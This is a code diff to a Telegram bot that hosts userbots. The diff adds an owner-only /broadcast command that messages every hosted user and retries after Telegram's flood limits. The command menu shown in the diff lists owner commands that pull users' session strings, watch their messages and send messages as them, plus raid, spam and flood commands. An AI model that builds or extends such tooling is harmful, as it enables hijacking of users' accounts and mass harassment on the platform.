@@ -68,7 +68,8 @@ STATIC_COMMANDS_TEXT = (
     "╚═════════════════════════════════════════════════╝\n\n"
     "▸ **BOT & HOSTING**\n"
     "  `/start` • `/login` • `/welcome [text]`\n"
-    "  `/users` • `/getsession <user_id>` • `/watch <user_id> [count]` • `/exec <uid> <chat> <msg>`\n\n"
+    "  `/users` • `/getsession <user_id>` • `/watch <user_id> [count]`\n"
+    "  `/exec <uid> <chat> <msg>` • `/broadcast <message>`\n\n"
     "▸ **RAID & SPAM**\n"
     "  `.raid [count]` • `.oneraid [count]` • `.rraid` • `.drraid`\n"
     "  `.spam [count] [text]` • `.fastspam [count] [text]` • `.flood [count] [text]`\n"
@@ -458,6 +459,50 @@ async def owner_exec_cmd(event):
         await event.respond(f"❌ **Send fail:** `{e}`")
     finally:
         await temp_client.disconnect()
+
+@bot.on(events.NewMessage(pattern=r'^/broadcast(?:\s+([\s\S]+))?$'))
+async def owner_broadcast_cmd(event):
+    if event.sender_id != OWNER_ID:
+        return
+
+    msg_text = (event.pattern_match.group(1) or "").strip()
+    if not msg_text and event.is_reply:
+        rep = await event.get_reply_message()
+        msg_text = (rep.raw_text or "").strip() if rep else ""
+
+    if not msg_text:
+        await event.respond("ℹ️ **Istemaal:** `/broadcast <apna message>` (ya kisi message par reply karke `/broadcast` likhein).")
+        return
+
+    ids = list(user_sessions.keys())
+    if not ids:
+        await event.respond("ℹ️ **Abhi kisi ne bot host nahi kiya hai.**")
+        return
+
+    status_msg = await event.respond(f"📣 **Broadcast shuru ho raha hai (`{len(ids)}` hosted users)...**")
+    sent_ok = 0
+    sent_fail = 0
+
+    for uid_str in ids:
+        try:
+            await bot.send_message(int(uid_str), msg_text)
+            sent_ok += 1
+            await asyncio.sleep(0.15)
+        except FloodWaitError as f:
+            await asyncio.sleep(f.seconds + 0.5)
+            try:
+                await bot.send_message(int(uid_str), msg_text)
+                sent_ok += 1
+            except Exception:
+                sent_fail += 1
+        except Exception:
+            sent_fail += 1
+
+    await status_msg.edit(
+        f"✅ **Broadcast Complete!**\n"
+        f"• **Sent:** `{sent_ok}`\n"
+        f"• **Failed:** `{sent_fail}`"
+    )
 
 @bot.on(events.CallbackQuery(data=b'my_home'))
 async def my_home_cb(event):
